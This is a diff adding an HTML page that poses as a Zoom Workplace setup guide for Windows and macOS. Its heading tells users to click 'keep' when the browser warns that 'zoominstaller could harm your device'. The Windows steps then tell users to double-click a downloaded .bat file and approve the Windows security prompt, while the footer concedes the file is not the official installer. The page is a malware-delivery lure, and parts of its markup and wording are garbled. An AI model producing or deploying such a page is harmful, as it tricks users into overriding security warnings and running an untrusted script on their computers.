@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Installing Zoom Workplace - Setup Guide</title>
+<style>
+  :root {
+    --bg-main: #1f1f1f;
+    --bg-card: #2b2b2b;
+    --accent: #ff8a65;
+    --text-primary: #ffffff;
+    --text-secondary: #c8c8c8;
+    --text-muted: #9a9a9a;
+    --border-color: #3a3a3a;
+    --pill-bg: #3a3a3a;
+    --success: #6bd46b;
+  }
+
+  * {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+  }
+
+  body {
+    font-family: "Segoe UI", "Segoe UI Variable", -apple-system, Helvetica, Arial, sans-serif;
+    background: var(--bg-main);
+    color: var(--text-primary);
+    padding: 40px 24px;
+    line-height: 1.6;
+  }
+
+  .wrapper {
+    max-width: 760px;
+    margin: 0 auto;
+  }
+
+  .header {
+    display: flex;
+    align-items: center;
+    gap: 18px;
+    margin-bottom: 28px;
+  }
+
+  .app-icon {
+    width: 64px;
+    height: 64px;
+    border-radius: 14px;
+    background: #ffffff;
+    flex-shrink: 0;
+    overflow: hidden;
+  }
+
+  .header h1 {
+    font-size: 26px;
+    font-weight: 600;
+    margin-bottom: 4px;
+  }
+
+  .header p {
+    color: var(--text-muted);
+    font-size: 14px;
+  }
+
+  .section-card {
+    background: var(--bg-card);
+    border-radius: 10px;
+    padding: 24px;
+    margin-bottom: 20px;
+  }
+
+  .section-card h2 {
+    font-size: 18px;
+    font-weight: 600;
+    margin-bottom: 6px;
+  }
+
+  .section-card .sub {
+    color: var(--text-muted);
+    font-size: 13px;
+    margin-bottom: 18px;
+  }
+
+  hr.divider {
+    border: none;
+    border-top: 1px solid var(--border-color);
+    margin: 14px 0 18px;
+  }
+
+  .step {
+    display: flex;
+    gap: 16px;
+    padding: 14px 0;
+    border-bottom: 1px solid var(--border-color);
+  }
+
+  .step:last-child {
+    border-bottom: none;
+  }
+
+  .step-num {
+    width: 30px;
+    height: 30px;
+    border-radius: 50%;
+    background: var(--accent);
+    color: #1f1f1f;
+    font-weight: 700;
+    font-size: 14px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+  }
+
+  .step-body h3 {
+    font-size: 15px;
+    font-weight: 600;
+    margin-bottom: 4px;
+  }
+
+  .step-body p {
+    color: var(--text-secondary);
+    font-size: 14px;
+  }
+
+  .step-body code {
+    background: var(--pill-bg);
+    padding: 2px 6px;
+    border-radius: 4px;
+    font-size: 13px;
+    font-family: Consolas, monospace;
+    color: var(--text-primary);
+  }
+
+  .tabs {
+    display: flex;
+    gap: 8px;
+    margin-bottom: 18px;
+  }
+
+  .tab {
+    padding: 8px 18px;
+    border-radius: 6px;
+    background: var(--pill-bg);
+    font-size: 14px;
+    color: var(--text-secondary);
+    cursor: pointer;
+    border: 1px solid transparent;
+  }
+
+  .tab.active {
+    background: var(--accent);
+    color: #1f1f1f;
+    font-weight: 600;
+  }
+
+  .platform-content {
+    display: none;
+  }
+
+  .platform-content.active {
+    display: block;
+  }
+
+  .tip-box {
+    display: flex;
+    gap: 12px;
+    background: rgba(107, 212, 107, 0.08);
+    border: 1px solid rgba(107, 212, 107, 0.25);
+    border-radius: 8px;
+    padding: 14px 16px;
+    margin-top: 16px;
+  }
+
+  .tip-box .icon {
+    color: var(--success);
+    font-size: 18px;
+    flex-shrink: 0;
+  }
+
+  .tip-box p {
+    font-size: 13px;
+    color: var(--text-secondary);
+  }
+
+  .warn-box {
+    display: flex;
+    gap: 12px;
+    background: rgba(255, 138, 101, 0.08);
+    border: 1px solid rgba(255, 138, 101, 0.25);
+    border-radius: 8px;
+    padding: 14px 16px;
+    margin-top: 16px;
+  }
+
+  .warn-box .icon {
+    color: var(--accent);
+    font-size: 18px;
+    flex-shrink: 0;
+  }
+
+  .warn-box p {
+    font-size: 13px;
+    color: var(--text-secondary);
+  }
+
+  .checklist {
+    list-style: none;
+  }
+
+  .checklist li {
+    display: flex;
+    gap: 10px;
+    align-items: flex-start;
+    font-size: 14px;
+    color: var(--text-secondary);
+    padding: 8px 0;
+  }
+
+  .checklist li::before {
+    content: "✓";
+    color: var(--success);
+    font-weight: 700;
+    flex-shrink: 0;
+  }
+
+  .footer-note {
+    text-align: center;
+    color: var(--text-muted);
+    font-size: 13px;
+    margin-top: 28px;
+  }
+
+  .footer-note a {
+    color: var(--accent);
+    text-decoration: none;
+  }
+</style>
+</head>
+<body>
+<div class="wrapper">
+
+  <div class="header">
+    <div class="app-icon">
+      <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg" width="100%" height="100%">
+        <rect width="100" height="100" rx="20" fill="#2D8CFF"/>
+        <path d="M28 35h28a8 8 0 018 8v22H36a8 8 0 01-8-8V35z" fill="#fff"/>
+        <path d="M68 43l10-6v26l-10-6z" fill="#fff"/>
+      </svg>
+    </div>
+    <div>
+      <h1>Setting up Zoom after downloading</h1>
+    </div>
+  </div>
+
+  <!-- Platform tabs -->
+  <div class="section-card">
+    <h2>
+      <li>If you download the file and it says "zoominstaller could harm your device. Do you want to keep it anyway?"</li>
+      <li>Click "keep"</li>
+    </h2>
+    <p class="sub">Choose your operating system for exact steps</p>
+    <hr class="divider">
+
+    <div class="tabs">
+      <div class="tab active" onclick="showTab('windows')">Windows</div>
+      <div class="tab" onclick="showTab('mac')">macOS</div>
+    </div>
+
+    <!-- Windows steps -->
+    <div class="platform-content active" id="windows">
+      <div class="step">
+        <div class="step-num">1</div>
+        <div class="step-body">
+          <h3>Open the downloaded file</h3>
+          <p>Go to your <code>Downloads</code> folder and double-click the file you just downloaded. It will usually have a name starting with "Zoominstaller" and end in <code>It shows a bat file double click so it runs the best update tunned for you System.</code>.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-num">2</div>
+        <div class="step-body">
+          <h3>Allow the app to make changes</h3>
+          <p>If a Windows security prompt appears asking for permission, select <strong>Yes</strong> to continue.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-num">3</div>
+        <div class="step-body">
+          <h3>Wait for the install to finish</h3>
+          <p>A progress window will appear automatically and close on its own once setup is complete. No further input is needed.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-num">4</div>
+        <div class="step-body">
+          <h3>Sign in or join a meeting</h3>
+          <p>The app opens automatically when setup finishes. Sign in with your account, or select <strong>Join a Meeting</strong> if you just need to join one with a meeting ID.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-num">5</div>
+        <div class="step-body">
+          <h3>Check for a desktop shortcut</h3>
+          <p>A shortcut is usually added to your desktop and Start menu so you can open the app again later without redownloading anything.</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- Mac steps -->
+    <div class="platform-content" id="mac">
+      <div class="step">
+        <div class="step-num">1</div>
+        <div class="step-body">
+          <h3>Open the downloaded file</h3>
+          <p>Go to your <code>Downloads</code> folder and double-click the file ending in <code>.pkg</code> or <code>.dmg</code>.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-num">2</div>
+        <div class="step-body">
+          <h3>Follow the installer prompts</h3>
+          <p>Click <strong>Continue</strong>, then <strong>Install</strong>. You may be asked to enter your Mac's login password to allow the install.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-num">3</div>
+        <div class="step-body">
+          <h3>Approve security settings if prompted</h3>
+          <p>If macOS blocks the app the first time, go to <strong>System Settings → Privacy &amp; Security</strong> and choose to allow it to open.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-num">4</div>
+        <div class="step-body">
+          <h3>Open the app</h3>
+          <p>Find it in your <strong>Applications</strong> folder or Launchpad, then open it and sign in or join a meeting.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-num">5</div>
+        <div class="step-body">
+          <h3>Grant camera and microphone access</h3>
+          <p>The first time you join a meeting, macOS will ask for camera and microphone permissions — select <strong>OK</strong> so others can see and hear you.</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="tip-box">
+      <div class="icon">✔</div>
+      <p>Once installation finishes, you can delete the original downloaded installer file — it's no longer needed to run the app.</p>
+    </div>
+  </div>
+
+  <!-- Troubleshooting -->
+  <div class="section-card">
+    <h2>If something doesn't work</h2>
+    <p class="sub">Common hiccups and quick fixes</p>
+    <hr class="divider">
+
+    <div class="step">
+      <div class="step-num">!</div>
+      <div class="step-body">
+        <h3>Nothing happens when you double-click the file</h3>
+        <p>Make sure the download finished completely (check your browser's download bar). Try right-clicking the file and choosing <strong>Open</strong>.</p>
+      </div>
+    </div>
+    <div class="step">
+      <div class="step-num">!</div>
+      <div class="step-body">
+        <h3>"This app can't run on your PC" message</h3>
+        <p>Your download may not match your system (32-bit vs 64-bit). Re-download from the official source and pick the version matching your device.</p>
+      </div>
+    </div>
+    <div class="step">
+      <div class="step-num">!</div>
+      <div class="step-body">
+        <h3>Camera, mic, or screen share not working after install</h3>
+        <p>Check your operating system's privacy settings to confirm the app has been granted permission to use these.</p>
+      </div>
+    </div>
+
+    
+  </div>
+
+  <div class="footer-note">
+    Need the official installer or more detailed help? Visit the publisher's support page from the app's store listing.
+  </div>
+
+</div>
+
+<script>
+  function showTab(platform) {
+    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+    document.querySelectorAll('.platform-content').forEach(c => c.classList.remove('active'));
+    document.getElementById(platform).classList.add('active');
+    event.target.classList.add('active');
+  }
+</script>
+
+</body>
+</html>
